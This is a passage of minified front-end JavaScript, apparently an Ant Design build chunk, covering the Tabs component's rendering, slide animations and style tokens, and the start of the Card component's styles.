_?f?(n=O>0,o=O!==ea):(o=O<0,n=O!==en):(a=F<0,s=F!==en),i.createElement(tH,{onResize:e$},i.createElement("div",{ref:(0,tL.useComposeRef)(t,T),role:"tablist","aria-orientation":_?"horizontal":"vertical",className:(0,l.clsx)(`${$}-nav`,c,k?.header),style:{...P?.header,...u},onKeyDown:()=>{eu()}},i.createElement(tZ,{ref:I,position:"left",extra:g,prefixCls:$}),i.createElement(tH,{onResize:e$},i.createElement("div",{className:(0,l.clsx)(eM,{[`${eM}-ping-left`]:o,[`${eM}-ping-right`]:n,[`${eM}-ping-top`]:a,[`${eM}-ping-bottom`]:s}),ref:M},i.createElement(tH,{onResize:e$},i.createElement("div",{ref:A,className:`${$}-nav-list`,style:{transform:`translate(${O}px, ${F}px)`,transition:el?"none":void 0}},ek,i.createElement(tY,{ref:L,prefixCls:$,locale:v,editable:h,style:{...0===ek.length?void 0:ew,visibility:eR?"hidden":null}}),i.createElement("div",{className:(0,l.clsx)(`${$}-ink-bar`,k?.indicator,{[`${$}-ink-bar-animated`]:p.inkBar}),style:{...eI,...P?.indicator}}))))),i.createElement(o1,o3({},e,{removeAriaLabel:v?.removeAriaLabel,ref:D,prefixCls:$,tabs:eE,className:!eR&&eo,popupStyle:P?.popup,tabMoving:!!el})),i.createElement(tZ,{ref:R,position:"right",extra:g,prefixCls:$})))}),o8=({renderTabBar:e,...t})=>e?e(t,o5):i.createElement(o5,t),o7=i.forwardRef((e,t)=>{let{prefixCls:r,className:o,style:n,id:a,active:s,tabKey:c,children:u}=e,d=i.Children.count(u)>0;return i.createElement("div",{id:a&&`${a}-panel-${c}`,role:"tabpanel",tabIndex:s&&d?0:-1,"aria-labelledby":a&&`${a}-tab-${c}`,"aria-hidden":!s,style:n,className:(0,l.clsx)(r,s&&`${r}-active`,o),ref:t},u)});function o9(){return(o9=Object.assign.bind()).apply(this,arguments)}let ne=e=>{let{id:t,activeKey:r,animated:o,tabPosition:n,destroyOnHidden:a,contentStyle:s,contentClassName:c}=e,{prefixCls:u,tabs:d}=i.useContext(tA),p=o.tabPane,m=`${u}-tabpane`;return i.createElement("div",{className:(0,l.clsx)(`${u}-content-holder`)},i.createElement("div",{className:(0,l.clsx)(`${u}-content`,`${u}-content-${n}`,{[`${u}-content-animated`]:p})},d.map(e=>{let{key:n,forceRender:u,style:d,className:f,destroyOnHidden:g,...h}=e,v=n===r;return i.createElement(rs.default,o9({key:n,visible:v,forceRender:u,removeOnLeave:!!(a??g),leavedClassName:`${m}-hidden`},o.tabPaneMotion),({style:e,className:r},o)=>i.createElement(o7,o9({},h,{prefixCls:m,id:t,tabKey:n,animated:p,active:v,style:{...s,...d,...e},className:(0,l.clsx)(c,f,r),ref:o})))})))};function nt(){return(nt=Object.assign.bind()).apply(this,arguments)}let nr=0,no=i.forwardRef((e,r)=>{let{id:o,prefixCls:n="rc-tabs",className:a,items:s,direction:c,activeKey:u,defaultActiveKey:d,editable:p,animated:m,tabPosition:f="top",tabBarGutter:g,tabBarStyle:h,tabBarExtraContent:v,locale:b,more:y,destroyOnHidden:S,renderTabBar:x,onChange:C,onTabClick:w,onTabScroll:k,getPopupContainer:P,popupClassName:$,indicator:E,classNames:T,styles:I,...R}=e,M=i.useMemo(()=>(s||[]).filter(e=>e&&"object"==typeof e&&"key"in e),[s]),A="rtl"===c,D=function(e={inkBar:!0,tabPane:!1}){let t;return(t=!1===e?{inkBar:!1,tabPane:!1}:!0===e?{inkBar:!0,tabPane:!1}:{inkBar:!0,..."object"==typeof e?e:{}}).tabPaneMotion&&void 0===t.tabPane&&(t.tabPane=!0),!t.tabPaneMotion&&t.tabPane&&(t.tabPane=!1),t}(m),[L,_]=(0,i.useState)(!1);(0,i.useEffect)(()=>{_((void 0===t&&(t=(0,tM.default)()),t))},[]);let[O,j]=(0,tR.default)(d??M[0]?.key,u),[F,N]=(0,i.useState)(()=>M.findIndex(e=>e.key===O));(0,i.useEffect)(()=>{let e=M.findIndex(e=>e.key===O);-1===e&&(e=Math.max(0,Math.min(F,M.length-1)),j(M[e]?.key)),N(e)},[M.map(e=>e.key).join("_"),O,F]);let[V,B]=(0,tR.default)(null,o);(0,i.useEffect)(()=>{o||(B(`rc-tabs-${nr}`),nr+=1)},[]);let H={id:V,activeKey:O,animated:D,tabPosition:f,rtl:A,mobile:L},z={...H,editable:p,locale:b,more:y,tabBarGutter:g,onTabClick:function(e,t){w?.(e,t);let r=e!==O;j(e),r&&C?.(e)},onTabScroll:k,extra:v,style:h,getPopupContainer:P,popupClassName:(0,l.clsx)($,T?.popup),indicator:E,styles:I,classNames:T},U=i.useMemo(()=>({tabs:M,prefixCls:n}),[M,n]);return i.createElement(tA.Provider,{value:U},i.createElement("div",nt({ref:r,id:o,className:(0,l.clsx)(n,`${n}-${f}`,{[`${n}-mobile`]:L,[`${n}-editable`]:p,[`${n}-rtl`]:A},a)},R),i.createElement(o8,nt({},z,{renderTabBar:x})),i.createElement(ne,nt({destroyOnHidden:S},H,{contentStyle:I?.content,contentClassName:T?.content,animated:D}))))}),nn=e=>`${e}-css-var`;e.s(["default",0,nn],21883);var na=e.i(13541);let ni={motionAppear:!1,motionEnter:!0,motionLeave:!0};var ns=e.i(83293),ti=ti;let nl=e=>({animationDuration:e,animationFillMode:"both"}),nc=(e,t,r,o,n=!1)=>{let a=n?"&":"";return{[`
      ${a}${e}-enter,
      ${a}${e}-appear
    `]:{...nl(o),animationPlayState:"paused"},[`${a}${e}-leave`]:{...nl(o),animationPlayState:"paused"},[`
      ${a}${e}-enter${e}-enter-active,
      ${a}${e}-appear${e}-appear-active
    `]:{animationName:t,animationPlayState:"running"},[`${a}${e}-leave${e}-leave-active`]:{animationName:r,animationPlayState:"running",pointerEvents:"none"}}};e.s(["initMotion",0,nc],2366);let nu=new ti.default("antSlideUpIn",{"0%":{transform:"scaleY(0.8)",transformOrigin:"0% 0%",opacity:0},"100%":{transform:"scaleY(1)",transformOrigin:"0% 0%",opacity:1}}),nd=new ti.default("antSlideUpOut",{"0%":{transform:"scaleY(1)",transformOrigin:"0% 0%",opacity:1},"100%":{transform:"scaleY(0.8)",transformOrigin:"0% 0%",opacity:0}}),np=new ti.default("antSlideDownIn",{"0%":{transform:"scaleY(0.8)",transformOrigin:"100% 100%",opacity:0},"100%":{transform:"scaleY(1)",transformOrigin:"100% 100%",opacity:1}}),nm=new ti.default("antSlideDownOut",{"0%":{transform:"scaleY(1)",transformOrigin:"100% 100%",opacity:1},"100%":{transform:"scaleY(0.8)",transformOrigin:"100% 100%",opacity:0}}),nf={"slide-up":{inKeyframes:nu,outKeyframes:nd},"slide-down":{inKeyframes:np,outKeyframes:nm},"slide-left":{inKeyframes:new ti.default("antSlideLeftIn",{"0%":{transform:"scaleX(0.8)",transformOrigin:"0% 0%",opacity:0},"100%":{transform:"scaleX(1)",transformOrigin:"0% 0%",opacity:1}}),outKeyframes:new ti.default("antSlideLeftOut",{"0%":{transform:"scaleX(1)",transformOrigin:"0% 0%",opacity:1},"100%":{transform:"scaleX(0.8)",transformOrigin:"0% 0%",opacity:0}})},"slide-right":{inKeyframes:new ti.default("antSlideRightIn",{"0%":{transform:"scaleX(0.8)",transformOrigin:"100% 0%",opacity:0},"100%":{transform:"scaleX(1)",transformOrigin:"100% 0%",opacity:1}}),outKeyframes:new ti.default("antSlideRightOut",{"0%":{transform:"scaleX(1)",transformOrigin:"100% 0%",opacity:1},"100%":{transform:"scaleX(0.8)",transformOrigin:"100% 0%",opacity:0}})}},ng=(e,t)=>{let{antCls:r}=e,o=`${r}-${t}`,{inKeyframes:n,outKeyframes:a}=nf[t];return[nc(o,n,a,e.motionDurationMid),{[`
      ${o}-enter,
      ${o}-appear
    `]:{transform:"scale(0)",transformOrigin:"0% 0%",opacity:0,animationTimingFunction:e.motionEaseOutQuint,"&-prepare":{transform:"scale(1)"}},[`${o}-leave`]:{animationTimingFunction:e.motionEaseInQuint}}]};e.s(["initSlideMotion",0,ng,"slideDownIn",0,np,"slideDownOut",0,nm,"slideUpIn",0,nu,"slideUpOut",0,nd],64142);let nh=(0,x.genStyleHooks)("Tabs",e=>{let t=(0,ts.mergeToken)(e,{tabsCardPadding:e.cardPadding,dropdownEdgeChildVerticalPadding:e.paddingXXS,tabsDropdownHeight:200,tabsDropdownWidth:120,tabsHorizontalItemMargin:`0 0 0 ${(0,S.unit)(e.horizontalItemGutter)}`,tabsHorizontalItemMarginRTL:`0 0 0 ${(0,S.unit)(e.horizontalItemGutter)}`});return[(e=>{let{componentCls:t,cardPaddingSM:r,cardPaddingLG:o,cardHeightSM:n,cardHeightLG:a,horizontalItemPaddingSM:i,horizontalItemPaddingLG:s}=e;return{[t]:{"&-small":{[`> ${t}-nav`]:{[`${t}-tab`]:{padding:i,fontSize:e.titleFontSizeSM}}},"&-large":{[`> ${t}-nav`]:{[`${t}-tab`]:{padding:s,fontSize:e.titleFontSizeLG,lineHeight:e.lineHeightLG}}}},[`${t}-card`]:{[`&${t}-small`]:{[`> ${t}-nav`]:{[`${t}-tab`]:{padding:r},[`${t}-nav-add`]:{minWidth:n,minHeight:n}},[`&${t}-bottom`]:{[`> ${t}-nav ${t}-tab`]:{borderRadius:`0 0 ${(0,S.unit)(e.borderRadius)} ${(0,S.unit)(e.borderRadius)}`}},[`&${t}-top`]:{[`> ${t}-nav ${t}-tab`]:{borderRadius:`${(0,S.unit)(e.borderRadius)} ${(0,S.unit)(e.borderRadius)} 0 0`}},[`&${t}-right`]:{[`> ${t}-nav ${t}-tab`]:{borderRadius:{_skip_check_:!0,value:`0 ${(0,S.unit)(e.borderRadius)} ${(0,S.unit)(e.borderRadius)} 0`}}},[`&${t}-left`]:{[`> ${t}-nav ${t}-tab`]:{borderRadius:{_skip_check_:!0,value:`${(0,S.unit)(e.borderRadius)} 0 0 ${(0,S.unit)(e.borderRadius)}`}}}},[`&${t}-large`]:{[`> ${t}-nav`]:{[`${t}-tab`]:{padding:o},[`${t}-nav-add`]:{minWidth:a,minHeight:a}}}}}})(t),(e=>{let{componentCls:t,tabsHorizontalItemMarginRTL:r,iconCls:o,cardGutter:n,calc:a}=e;return{[`${t}-rtl`]:{direction:"rtl",[`${t}-nav`]:{[`${t}-tab`]:{margin:{_skip_check_:!0,value:r},[`${t}-tab:last-of-type`]:{marginLeft:{_skip_check_:!0,value:0}},[o]:{marginRight:{_skip_check_:!0,value:0},marginLeft:{_skip_check_:!0,value:(0,S.unit)(e.marginSM)}},[`${t}-tab-remove`]:{marginRight:{_skip_check_:!0,value:(0,S.unit)(e.marginXS)},marginLeft:{_skip_check_:!0,value:(0,S.unit)(a(e.marginXXS).mul(-1).equal())},[o]:{margin:0}}}},[`&${t}-left`]:{[`> ${t}-nav`]:{order:1},[`> ${t}-content-holder`]:{order:0}},[`&${t}-right`]:{[`> ${t}-nav`]:{order:0},[`> ${t}-content-holder`]:{order:1}},[`&${t}-card${t}-top, &${t}-card${t}-bottom`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab + ${t}-tab`]:{marginRight:{_skip_check_:!0,value:n},marginLeft:{_skip_check_:!0,value:0}}}}},[`${t}-dropdown-rtl`]:{direction:"rtl"},[`${t}-menu-item`]:{[`${t}-dropdown-rtl`]:{textAlign:{_skip_check_:!0,value:"right"}}}}})(t),(e=>{let{componentCls:t,margin:r,colorBorderSecondary:o,horizontalMargin:n,verticalItemPadding:a,verticalItemMargin:i,motionDurationSlow:s,calc:l}=e;return{[`${t}-top, ${t}-bottom`]:{flexDirection:"column",[`> ${t}-nav, > div > ${t}-nav`]:{margin:n,"&::before":{position:"absolute",right:{_skip_check_:!0,value:0},left:{_skip_check_:!0,value:0},borderBottom:`${(0,S.unit)(e.lineWidth)} ${e.lineType} ${o}`,content:"''"},[`${t}-ink-bar`]:{height:e.lineWidthBold,"&-animated":{transition:["width","left","right"].map(e=>`${e} ${s}`).join(", ")}},[`${t}-nav-wrap`]:{"&::before, &::after":{top:0,bottom:0,width:e.controlHeight},"&::before":{left:{_skip_check_:!0,value:0},boxShadow:e.boxShadowTabsOverflowLeft},"&::after":{right:{_skip_check_:!0,value:0},boxShadow:e.boxShadowTabsOverflowRight},[`&${t}-nav-wrap-ping-left::before`]:{opacity:1},[`&${t}-nav-wrap-ping-right::after`]:{opacity:1}}}},[`${t}-top`]:{[`> ${t}-nav,
        > div > ${t}-nav`]:{"&::before":{bottom:0},[`${t}-ink-bar`]:{bottom:0}}},[`${t}-bottom`]:{[`> ${t}-nav, > div > ${t}-nav`]:{order:1,marginTop:r,marginBottom:0,"&::before":{top:0},[`${t}-ink-bar`]:{top:0}},[`> ${t}-content-holder, > div > ${t}-content-holder`]:{order:0}},[`${t}-left, ${t}-right`]:{[`> ${t}-nav, > div > ${t}-nav`]:{flexDirection:"column",minWidth:l(e.controlHeight).mul(1.25).equal(),[`${t}-tab`]:{padding:a,textAlign:"center"},[`${t}-tab + ${t}-tab`]:{margin:i},[`${t}-nav-wrap`]:{flexDirection:"column","&::before, &::after":{right:{_skip_check_:!0,value:0},left:{_skip_check_:!0,value:0},height:e.controlHeight},"&::before":{top:0,boxShadow:e.boxShadowTabsOverflowTop},"&::after":{bottom:0,boxShadow:e.boxShadowTabsOverflowBottom},[`&${t}-nav-wrap-ping-top::before`]:{opacity:1},[`&${t}-nav-wrap-ping-bottom::after`]:{opacity:1}},[`${t}-ink-bar`]:{width:e.lineWidthBold,"&-animated":{transition:["height","top"].map(e=>`${e} ${s}`).join(", ")}},[`${t}-nav-list, ${t}-nav-operations`]:{flex:"1 0 auto",flexDirection:"column"}}},[`${t}-left`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-ink-bar`]:{right:{_skip_check_:!0,value:0}}},[`> ${t}-content-holder, > div > ${t}-content-holder`]:{marginLeft:{_skip_check_:!0,value:(0,S.unit)(l(e.lineWidth).mul(-1).equal())},borderLeft:{_skip_check_:!0,value:`${(0,S.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`},[`> ${t}-content > ${t}-tabpane`]:{paddingLeft:{_skip_check_:!0,value:e.paddingLG}}}},[`${t}-right`]:{[`> ${t}-nav, > div > ${t}-nav`]:{order:1,[`${t}-ink-bar`]:{left:{_skip_check_:!0,value:0}}},[`> ${t}-content-holder, > div > ${t}-content-holder`]:{order:0,marginRight:{_skip_check_:!0,value:l(e.lineWidth).mul(-1).equal()},borderRight:{_skip_check_:!0,value:`${(0,S.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`},[`> ${t}-content > ${t}-tabpane`]:{paddingRight:{_skip_check_:!0,value:e.paddingLG}}}}}})(t),(e=>{let{componentCls:t,itemHoverColor:r,dropdownEdgeChildVerticalPadding:o}=e;return{[`${t}-dropdown`]:{...(0,ns.resetComponent)(e),position:"absolute",top:-9999,left:{_skip_check_:!0,value:-9999},zIndex:e.zIndexPopup,display:"block","&-hidden":{display:"none"},[`${t}-dropdown-menu`]:{maxHeight:e.tabsDropdownHeight,margin:0,padding:`${(0,S.unit)(o)} 0`,overflowX:"hidden",overflowY:"auto",textAlign:{_skip_check_:!0,value:"left"},listStyleType:"none",backgroundColor:e.colorBgContainer,backgroundClip:"padding-box",borderRadius:e.borderRadiusLG,outline:"none",boxShadow:e.boxShadowSecondary,"&-item":{...ns.textEllipsis,display:"flex",alignItems:"center",minWidth:e.tabsDropdownWidth,margin:0,padding:`${(0,S.unit)(e.paddingXXS)} ${(0,S.unit)(e.paddingSM)}`,color:e.colorText,fontWeight:"normal",fontSize:e.fontSize,lineHeight:e.lineHeight,cursor:"pointer",transition:`all ${e.motionDurationSlow}`,"> span":{flex:1,whiteSpace:"nowrap"},"&-remove":{flex:"none",marginLeft:{_skip_check_:!0,value:e.marginSM},color:e.colorIcon,fontSize:e.fontSizeSM,background:"transparent",border:0,cursor:"pointer","&:hover":{color:r}},"&:hover":{background:e.controlItemBgHover},"&-disabled":{"&, &:hover":{color:e.colorTextDisabled,background:"transparent",cursor:"not-allowed"}}}}}}})(t),(e=>{let{componentCls:t,tabsCardPadding:r,cardBg:o,cardGutter:n,colorBorderSecondary:a,itemSelectedColor:i}=e;return{[`${t}-card`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab`]:{margin:0,padding:r,background:o,border:`${(0,S.unit)(e.lineWidth)} ${e.lineType} ${a}`,transition:`all ${e.motionDurationSlow} ${e.motionEaseInOut}`},[`${t}-tab-active`]:{color:i,background:e.colorBgContainer},[`${t}-tab-focus:has(${t}-tab-btn:focus-visible)`]:(0,ns.genFocusOutline)(e,-3),[`& ${t}-tab${t}-tab-focus ${t}-tab-btn:focus-visible`]:{outline:"none"},[`${t}-ink-bar`]:{visibility:"hidden"}},[`&${t}-top, &${t}-bottom`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab + ${t}-tab`]:{marginLeft:{_skip_check_:!0,value:(0,S.unit)(n)}}}},[`&${t}-top`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab`]:{borderRadius:`${(0,S.unit)(e.borderRadiusLG)} ${(0,S.unit)(e.borderRadiusLG)} 0 0`},[`${t}-tab-active`]:{borderBottomColor:e.colorBgContainer}}},[`&${t}-bottom`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab`]:{borderRadius:`0 0 ${(0,S.unit)(e.borderRadiusLG)} ${(0,S.unit)(e.borderRadiusLG)}`},[`${t}-tab-active`]:{borderTopColor:e.colorBgContainer}}},[`&${t}-left, &${t}-right`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab + ${t}-tab`]:{marginTop:(0,S.unit)(n)}}},[`&${t}-left`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab`]:{borderRadius:{_skip_check_:!0,value:`${(0,S.unit)(e.borderRadiusLG)} 0 0 ${(0,S.unit)(e.borderRadiusLG)}`}},[`${t}-tab-active`]:{borderRightColor:{_skip_check_:!0,value:e.colorBgContainer}}}},[`&${t}-right`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab`]:{borderRadius:{_skip_check_:!0,value:`0 ${(0,S.unit)(e.borderRadiusLG)} ${(0,S.unit)(e.borderRadiusLG)} 0`}},[`${t}-tab-active`]:{borderLeftColor:{_skip_check_:!0,value:e.colorBgContainer}}}}}}})(t),(e=>{let{componentCls:t,tabsCardPadding:r,cardHeight:o,cardGutter:n,itemHoverColor:a,itemActiveColor:i,colorBorderSecondary:s}=e;return{[t]:{...(0,ns.resetComponent)(e),display:"flex",[`> ${t}-nav, > div > ${t}-nav`]:{position:"relative",display:"flex",flex:"none",alignItems:"center",[`${t}-nav-wrap`]:{position:"relative",display:"flex",flex:"auto",alignSelf:"stretch",overflow:"hidden",whiteSpace:"nowrap",transform:"translate(0)","&::before, &::after":{position:"absolute",zIndex:1,opacity:0,transition:`opacity ${e.motionDurationSlow}`,content:"''",pointerEvents:"none"}},[`${t}-nav-list`]:{position:"relative",display:"flex",transition:`opacity ${e.motionDurationSlow}`},[`${t}-nav-operations`]:{display:"flex",alignSelf:"stretch"},[`${t}-nav-operations-hidden`]:{position:"absolute",visibility:"hidden",pointerEvents:"none"},[`${t}-nav-more`]:{position:"relative",padding:r,background:"transparent",border:0,color:e.colorText,"&::after":{position:"absolute",right:{_skip_check_:!0,value:0},bottom:0,left:{_skip_check_:!0,value:0},height:e.calc(e.controlHeightLG).div(8).equal(),transform:"translateY(100%)",content:"''"}},[`${t}-nav-add`]:{minWidth:o,minHeight:o,marginLeft:{_skip_check_:!0,value:n},background:"transparent",border:`${(0,S.unit)(e.lineWidth)} ${e.lineType} ${s}`,borderRadius:`${(0,S.unit)(e.borderRadiusLG)} ${(0,S.unit)(e.borderRadiusLG)} 0 0`,outline:"none",cursor:"pointer",color:e.colorText,transition:`all ${e.motionDurationSlow} ${e.motionEaseInOut}`,"&:hover":{color:a},"&:active, &:focus:not(:focus-visible)":{color:i},...(0,ns.genFocusStyle)(e,-3)}},[`${t}-extra-content`]:{flex:"none"},[`${t}-ink-bar`]:{position:"absolute",background:e.inkBarColor,pointerEvents:"none"},...(e=>{let{componentCls:t,itemActiveColor:r,itemHoverColor:o,iconCls:n,tabsHorizontalItemMargin:a,horizontalItemPadding:i,itemSelectedColor:s,itemColor:l}=e,c=`${t}-tab`;return{[c]:{position:"relative",WebkitTouchCallout:"none",WebkitTapHighlightColor:"transparent",display:"inline-flex",alignItems:"center",padding:i,fontSize:e.titleFontSize,background:"transparent",border:0,outline:"none",cursor:"pointer",color:l,"&-btn, &-remove":{"&:focus:not(:focus-visible), &:active":{color:r}},"&-btn":{outline:"none",transition:`all ${e.motionDurationSlow}`,[`${c}-icon:not(:last-child)`]:{marginInlineEnd:e.marginSM}},"&-remove":{flex:"none",lineHeight:1,marginRight:{_skip_check_:!0,value:e.calc(e.marginXXS).mul(-1).equal()},marginLeft:{_skip_check_:!0,value:e.marginXS},color:e.colorIcon,fontSize:e.fontSizeSM,background:"transparent",border:"none",outline:"none",cursor:"pointer",transition:`all ${e.motionDurationSlow}`,"&:hover":{color:e.colorTextHeading},...(0,ns.genFocusStyle)(e)},"&:hover":{color:o},[`&${c}-active ${c}-btn`]:{color:s},[`&${c}-focus ${c}-btn:focus-visible`]:(0,ns.genFocusOutline)(e),[`&${c}-disabled`]:{color:e.colorTextDisabled,cursor:"not-allowed"},[`&${c}-disabled ${c}-btn, &${c}-disabled ${t}-remove`]:{"&:focus, &:active":{color:e.colorTextDisabled}},[`& ${c}-remove ${n}`]:{margin:0,verticalAlign:"middle"},[`${n}:not(:last-child)`]:{marginRight:{_skip_check_:!0,value:e.marginSM}}},[`${c} + ${c}`]:{margin:{_skip_check_:!0,value:a}}}})(e),[`${t}-content`]:{position:"relative",width:"100%"},[`${t}-content-holder`]:{flex:"auto",minWidth:0,minHeight:0},[`${t}-tabpane`]:{...(0,ns.genFocusStyle)(e),"&-hidden":{display:"none"}}},[`${t}-centered`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-nav-wrap`]:{[`&:not([class*='${t}-nav-wrap-ping']) > ${t}-nav-list`]:{margin:"auto"}}}}}})(t),(e=>{let{componentCls:t,motionDurationSlow:r}=e;return[{[t]:{[`${t}-switch`]:{"&-appear, &-enter":{transition:"none","&-start":{opacity:0},"&-active":{opacity:1,transition:`opacity ${r}`}},"&-leave":{position:"absolute",transition:"none",inset:0,"&-start":{opacity:1},"&-active":{opacity:0,transition:`opacity ${r}`}}}}},[ng(e,"slide-up"),ng(e,"slide-down")]]})(t)]},e=>{let{cardHeight:t,cardHeightSM:r,cardHeightLG:o,controlHeight:n,controlHeightLG:a}=e,i=t||a,s=r||n,l=o||a+8;return{zIndexPopup:e.zIndexPopupBase+50,cardBg:e.colorFillAlter,cardHeight:i,cardHeightSM:s,cardHeightLG:l,cardPadding:`${(i-e.fontHeight)/2-e.lineWidth}px ${e.padding}px`,cardPaddingSM:`${(s-e.fontHeight)/2-e.lineWidth}px ${e.paddingXS}px`,cardPaddingLG:`${(l-e.fontHeightLG)/2-e.lineWidth}px ${e.padding}px`,titleFontSize:e.fontSize,titleFontSizeLG:e.fontSizeLG,titleFontSizeSM:e.fontSize,inkBarColor:e.colorPrimary,horizontalMargin:`0 0 ${e.margin}px 0`,horizontalItemGutter:32,horizontalItemMargin:"",horizontalItemMarginRTL:"",horizontalItemPadding:`${e.paddingSM}px 0`,horizontalItemPaddingSM:`${e.paddingXS}px 0`,horizontalItemPaddingLG:`${e.padding}px 0`,verticalItemPadding:`${e.paddingXS}px ${e.paddingLG}px`,verticalItemMargin:`${e.margin}px 0 0 0`,itemColor:e.colorText,itemSelectedColor:e.colorPrimary,itemHoverColor:e.colorPrimaryHover,itemActiveColor:e.colorPrimaryActive,cardGutter:e.marginXXS/2}}),nv=i.forwardRef((e,t)=>{var r,o;let n,{type:a,className:s,rootClassName:u,size:p,onEdit:m,hideAdd:f,centered:g,addIcon:h,removeIcon:v,moreIcon:b,more:y,popupClassName:S,children:x,items:C,animated:w,style:k,indicatorSize:P,indicator:$,classNames:E,styles:T,destroyInactiveTabPane:I,destroyOnHidden:R,tabPlacement:M,tabPosition:A,...D}=e,{prefixCls:L}=D,{getPrefixCls:_,direction:O,getPopupContainer:N,className:V,style:B,classNames:H,styles:z}=(0,c.useComponentConfig)("tabs"),{tabs:U}=i.useContext(c.ConfigContext),W=_("tabs",L),q=nn(W),[G,J]=nh(W,q),X=i.useRef(null);i.useImperativeHandle(t,()=>({nativeElement:X.current})),"editable-card"===a&&(n={onEdit:(e,{key:t,event:r})=>{m?.("add"===e?r:t,e)},removeIcon:v??U?.removeIcon??i.createElement(tw,null),addIcon:(h??U?.addIcon)||i.createElement(tI,null),showAdd:!0!==f});let K=_(),Q=(0,F.default)(p),Y=(r=C,o=x,r?r.map(e=>({...e,destroyOnHidden:e.destroyOnHidden??e.destroyInactiveTabPane})):(0,d.toArray)(o).map(e=>{if(i.isValidElement(e)){let{key:t,props:r}=e,{tab:o,...n}=r||{};return{key:String(t),...n,label:o}}return null}).filter(e=>e)),Z=function(e,t={inkBar:!0,tabPane:!1}){let r;return(r=!1===t?{inkBar:!1,tabPane:!1}:!0===t?{inkBar:!0,tabPane:!0}:{inkBar:!0,..."object"==typeof t?t:{}}).tabPane&&(r.tabPaneMotion={...ni,motionName:(0,na.getTransitionName)(e,"switch")}),r}(W,w),ee={align:$?.align??U?.indicator?.align,size:$?.size??P??U?.indicator?.size??U?.indicatorSize},et=i.useMemo(()=>{let e=M??A??void 0,t="rtl"===O;switch(e){case"start":return t?"right":"left";case"end":return t?"left":"right";default:return e}},[M,A,O]),er={...e,size:Q,tabPlacement:et,items:Y},[eo,en]=(0,j.useMergeSemantic)([H,E],[z,T],{props:er},{popup:{_default:"root"}});return i.createElement(no,{ref:X,direction:O,getPopupContainer:N,...D,items:Y,className:(0,l.clsx)({[`${W}-large`]:"large"===Q,[`${W}-small`]:"small"===Q,[`${W}-card`]:["card","editable-card"].includes(a),[`${W}-editable-card`]:"editable-card"===a,[`${W}-centered`]:g},V,s,u,eo.root,G,J,q),classNames:{...eo,popup:(0,l.clsx)(S,G,J,q,eo.popup?.root)},styles:en,style:{...en.root,...B,...k},editable:n,more:{icon:U?.more?.icon??U?.moreIcon??b??i.createElement(t$,null),transitionName:`${K}-slide-up`,...y},prefixCls:W,animated:Z,indicator:ee,destroyOnHidden:R??I,tabPosition:et})});nv.TabPane=()=>null;let nb=({prefixCls:e,className:t,hoverable:r=!0,...o})=>{let{getPrefixCls:n}=i.useContext(c.ConfigContext),a=n("card",e),s=(0,l.clsx)(`${a}-grid`,t,{[`${a}-grid-hoverable`]:r});return i.createElement("div",{...o,className:s})},ny=(0,x.genStyleHooks)("Card",e=>{let t=(0,ts.mergeToken)(e,{cardShadow:e.boxShadowCard,cardHeadPadding:e.padding,cardPaddingBase:e.paddingLG,cardActionsIconSize:e.fontSize});return[(e=>{let{componentCls:t,cardShadow:r,cardHeadPadding:o,colorBorderSecondary:n,boxShadowTertiary:a,bodyPadding:i,extraColor:s,motionDurationMid:l}=e;return{[t]:{...(0,ns.resetComponent)(e),position:"relative",background:e.colorBgContainer,borderRadius:e.borderRadiusLG,[`&:not(${t}-bordered)`]:{boxShadow:a},[`${t}-head`]:(e=>{let{antCls:t,componentCls:r,headerHeight:o,headerPadding:n,tabsMarginBottom:a}=e;return{display:"flex",justifyContent:"center",flexDirection:"column",minHeight:o,marginBottom:-1,padding:`0 ${(0,S.unit)(n)}`,color:e.colorTextHeading,fontWeight:e.fontWeightStrong,fontSize:e.headerFontSize,background:e.headerBg,borderBottom:`${(0,S.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorderSecondary}`,borderRadius:`${(0,S.unit)(e.borderRadiusLG)} ${(0,S.unit)(e.borderRadiusLG)} 0 0`,...(0,ns.clearFix)(),"&-wrapper":{width:"100%",display:"flex",alignItems:"center"},"&-title":{display:"inline-block",flex:1,...ns.textEllipsis,[`
          > ${r}-typography,
          > ${r}-typography-edit-content
        `]:{insetInlineStart:0,marginTop:0,marginBottom:0}},[`${t}-tabs-top`]:{clear:"both",marginBottom:a,color:e.colorText,fontWeight:"normal",fontSize:e.fontSize,"&-bar":{borderBottom:`${(0,S.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorderSecondary}`}}}})(e),[`${t}-extra`]:{marginInlineStart:"auto",color:s,fontWeight:"normal",fontSize:e.fontSize},[`${t}-body`]:{padding:i,borderRadius:`0 0 ${(0,S.unit)(e.borderRadiusLG)} ${(0,S.unit)(e.borderRadiusLG)}`,"&:first-child":{borderStartStartRadius:e.borderRadiusLG,borderStartEndRadius:e.borderRadiusLG},"&:not(:last-child)":{borderEndStartRadius:0,borderEndEndRadius:0}},[`${t}-grid`]:(e=>{let{cardPaddingBase:t,colorBorderSecondary:r,cardShadow:o,lineWidth:n}=e;return{width:"33.33%",padding:t,border:0,borderRadius:0,boxShadow:`
      ${(0,S.unit)(n)} 0 0 0 ${r},
      0 ${(0,S.unit)(n)} 0 0 ${r},
      ${(0,S.unit)(n)} ${(0,S.unit)(n)} 0 0 ${r},
      ${(0,S.unit)(n)} 0 0 0 ${r} inset,
      0 ${(0,S.unit)(n)} 0 0 ${r} inset;
